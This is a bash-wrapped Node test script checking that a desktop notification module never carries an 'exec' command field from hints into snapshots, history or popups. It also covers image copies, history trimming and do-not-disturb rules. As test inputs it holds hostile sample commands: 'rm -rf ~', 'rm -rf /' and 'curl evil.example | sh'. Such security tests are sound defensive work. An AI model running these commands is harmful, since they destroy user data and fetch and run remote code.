#!/usr/bin/env bash
set -euo pipefail

logic_file=$1

node - "$logic_file" <<'NODE'
const path = process.argv[2]
const logic = require(path)

function expect(actual, expected, description) {
  const a = JSON.stringify(actual)
  const e = JSON.stringify(expected)
  if (a !== e) {
    throw new Error(`${description}: expected ${e}, got ${a}`)
  }
}

// --- exec role must not exist anywhere in the module surface ---
expect(logic.execFromHints, undefined, "execFromHints must not be exported")
expect(Object.keys(logic).indexOf("execFromHints"), -1, "execFromHints must not appear in module.exports keys")

const hostileHints = { "omarchy-exec": "touch /tmp/pwned; rm -rf ~" }
const hostileNotification = {
  id: 7,
  appName: "evil-sender",
  summary: "hi",
  body: "",
  hints: hostileHints,
  urgency: 1,
}

const snapshot = logic.snapshotOf(hostileNotification, 1000)
expect(snapshot.exec, undefined, "snapshotOf must never produce an exec field, even from an omarchy-exec hint")
expect(Object.keys(snapshot).indexOf("exec"), -1, "snapshot keys must never include exec")
expect(logic.popupRoles().indexOf("exec"), -1, "POPUP_ROLES must never include exec")

const history = logic.historyEntry({ id: 7, originalId: 7, exec: "rm -rf /", app: "x", summary: "s", timestamp: 1 }, 1)
expect(history.exec, undefined, "historyEntry must strip any incoming exec field, even a hand-injected one")
expect(Object.keys(history).indexOf("exec"), -1, "history entry keys must never include exec")

const replacement = logic.replacementSnapshot(hostileNotification, 42, 2000)
expect(replacement.exec, undefined, "replacementSnapshot must never produce an exec field")
expect(replacement.id, 42, "replacementSnapshot preserves the original popup identity")
expect(replacement.originalId, 42, "replacementSnapshot preserves originalId")

const popup = logic.popupEntry({ id: 7, originalId: 7, exec: "curl evil.example | sh", app: "x", summary: "s", timestamp: 1, expireTimeout: 5000 }, 1)
expect(popup.exec, undefined, "popupEntry must strip any incoming exec field")

// --- persistablePopup copy descriptors: role, not a destination path ---
const withImage = { id: 1, originalId: 1, app: "x", summary: "s", appIcon: "file:///tmp/does-not-matter-icon.png", timestamp: 1 }
const persistable = logic.persistablePopup(withImage, "/state/notifications/images/")
expect(persistable.copies.length, 1, "one image copy descriptor for one file-backed appIcon")
expect(persistable.copies[0].role, "appIcon", "copy descriptor carries the role")
expect(persistable.copies[0].to, undefined, "copy descriptor must not carry a caller-facing destination path")
expect(persistable.entry.appIcon, "file:///state/notifications/images/1-1-appIcon", "entry still embeds the predicted final path")

// image:// URLs (in-process, die with the server object) degrade to empty,
// never attempted as a copy source.
const withInProcessImage = { id: 2, originalId: 2, app: "x", summary: "s", image: "image://foo/bar", timestamp: 1 }
const persistableInProcess = logic.persistablePopup(withInProcessImage, "/state/notifications/images/")
expect(persistableInProcess.copies.length, 0, "an image:// URL must never become a copy")
expect(persistableInProcess.entry.image, "", "an image:// URL degrades to empty, not a broken reference")

// --- history trimming/limit and malformed-entry skipping (untouched pinned logic) ---
function rawEntry(id, ts) {
  return JSON.stringify({ id, originalId: id, app: "x", summary: "s", timestamp: ts })
}
let raw = ""
for (let i = 1; i <= 12; i++) raw += rawEntry(i, i * 1000) + "\n"
raw += "{not valid json\n"
raw += rawEntry(13, 13000) + "\n"

const rows = logic.historyRows(raw, [], 1, 10)
expect(rows.length, 10, "history replay is trimmed to the limit even with a torn line present")
expect(rows[0].id, 13, "newest entry (13) sorts first")
expect(rows[9].id, 4, "trimming keeps exactly the newest 10 (ids 4..13)")

// --- DND bypass / ephemeral classification (untouched pinned logic) ---
expect(logic.shouldBypassDnd({ appName: "omarchy-action" }, 2), true, "omarchy-action always bypasses DND")
expect(logic.shouldBypassDnd({ appName: "notify-send", urgency: 2 }, 2), true, "critical notify-send bypasses DND")
expect(logic.shouldBypassDnd({ appName: "notify-send", urgency: 1 }, 2), false, "non-critical notify-send does not bypass DND")
expect(logic.shouldBypassDnd({ appName: "Discord", urgency: 2 }, 2), false, "a branded chat app does not bypass DND merely via urgency=critical")
expect(logic.isEphemeralApp("notify-send"), true, "notify-send is ephemeral")
expect(logic.isEphemeralApp("omarchy-action"), true, "omarchy-action is ephemeral")
expect(logic.isEphemeralApp("Discord"), false, "an ordinary app is not ephemeral")

console.log("security-notifications-logic: all NotificationLogic.js behavior assertions passed")
NODE
